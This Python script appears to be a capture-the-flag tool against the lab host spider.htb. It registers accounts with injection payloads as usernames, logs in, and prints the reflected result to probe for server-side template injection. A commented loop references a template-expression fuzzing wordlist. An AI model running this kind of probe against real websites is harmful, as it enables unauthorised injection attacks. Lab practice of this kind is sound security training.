import requests
import re
import time
import html


def getUser(session):
    burp0_url = "http://spider.htb:80/user"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://spider.htb/", "Upgrade-Insecure-Requests": "1"}
    r = session.get(burp0_url, headers=burp0_headers)

    name = re.search('name="username" readonly value="(.*)"', r.text, re.IGNORECASE)

    if name:
        return name.group(1)
    return None
    # print(r.text)

def login(UUID):

    session = requests.session()

    burp0_url = "http://spider.htb:80/login"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://spider.htb", "Connection": "close", "Referer": "http://spider.htb/login?uuid=15bb1112-6b65-4528-8d72-7edd7d7ad32e", "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"username": UUID, "password": "secaura"}
    r = session.post(burp0_url, headers=burp0_headers, data=burp0_data)
    # print(r.text)
    return session

def grabUUID(text):
    UUID = re.search('name=\"username\" value=\"(.*)\"', text, re.IGNORECASE)

    if UUID:
        return UUID.group(1)
    return "NO UUID"

def createAccount(fuzz):
    burp0_url = "http://spider.htb:80/register"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://spider.htb", "Connection": "close", "Referer": "http://spider.htb/register", "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"username": fuzz, "confirm_username": fuzz, "password": "secaura", "confirm_password": "secaura"}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    # print(r.text)
    return grabUUID(r.text)

def htmlDecode(text):
    try:
        return html.unescape(text)
    except:
        return text


def main():
    while True:
    # with open("/usr/share/seclists/Fuzzing/template-engines-expression.txt") as f:
    #     for line in f:
        time.sleep(0.5)
            # fuzz = line.strip()
            # UUID = createAccount(fuzz)
        fuzz = input(">_")
        UUID = createAccount(fuzz)
        session = login(UUID)
        print(f"{fuzz} -> {htmlDecode(getUser(session))}")

main()
